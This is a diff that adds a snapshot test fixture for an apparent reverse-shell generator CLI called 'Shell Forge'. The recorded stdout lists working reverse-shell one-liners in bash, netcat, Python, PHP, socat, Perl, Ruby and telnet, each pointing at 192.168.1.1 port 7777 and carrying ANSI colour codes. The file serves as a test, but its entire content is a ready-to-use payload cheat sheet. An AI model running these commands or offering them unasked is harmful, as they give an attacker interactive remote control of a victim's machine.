@@ -1,0 +1,52 @@
+---
+source: tests/cli.rs
+expression: stdout
+---
+
+ _______           _______  _        _        ______________    _______  _______  _______  _______  _______ 
+(  ____ \|\     /|(  ____ \( \      ( \      ( |          | )  (  ____ \(  ___  )(  ____ )(  ____ \(  ____ \
+| (    \/| )   ( || (    \/| (      | (      | |          | |  | (    \/| (   ) || (    )|| (    \/| (    \/
+| (_____ | (___) || (__    | |      | |      (_|__________|_)  | (__    | |   | || (____)|| |      | (__    
+(_____  )|  ___  ||  __)   | |      | |            |  |        |  __)   | |   | ||     __)| | ____ |  __)   
+      ) || (   ) || (      | |      | |            |  |        | (      | |   | || (\ (   | | \_  )| (      
+/\____) || )   ( || (____/\| (____/\| (____/\      |  |        | )      | (___) || ) \ \__| (___) || (____/\
+\_______)|/     \|(_______/(_______/(_______/      |  |        |/       (_______)|/   \__/(_______)(_______/
+                                                   |__|                                        version 1.0.1
+                                                   (__)
+~~~~~~~~~~~~~~~~~~~~~~~~~
+Forging shells
+~~~~~~~~~~~~~~~~~~~~~~~~~
+Format : top
+IP     : 192.168.1.1
+Port   : 7777
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+----------BASH-I-----------
+sh -i >& /dev/tcp/[36m192.168.1.1[39m/[36m7777[39m 0>&1
+
+----------NC-E-----------
+nc [36m192.168.1.1[39m [36m7777[39m -e sh
+
+----------PYTHON-----------
+export RHOST="[36m192.168.1.1[39m";export RPORT=[36m7777[39m;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+----------PYTHON3-----------
+export RHOST="[36m192.168.1.1[39m";export RPORT=[36m7777[39m;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+----------PHP-----------
+php -r '$sock=fsockopen("[36m192.168.1.1[39m",[36m7777[39m);`sh <&3 >&3 2>&3`;'
+
+----------SOCAT-----------
+socat TCP:[36m192.168.1.1[39m:[36m7777[39m EXEC:sh
+
+----------PERL-----------
+perl -e 'use Socket;$i="[36m192.168.1.1[39m";$p=[36m7777[39m;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+
+----------RUBY-----------
+ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("[36m192.168.1.1[39m",[36m7777[39m))'
+
+----------BASH196-----------
+0<&196;exec 196<>/dev/tcp/[36m192.168.1.1[39m/[36m7777[39m; sh <&196 >&196 2>&196
+
+----------TELNET-----------
+TF=$(mktemp -u);mkfifo $TF && telnet [36m192.168.1.1[39m [36m7777[39m 0<$TF | sh 1>$TF
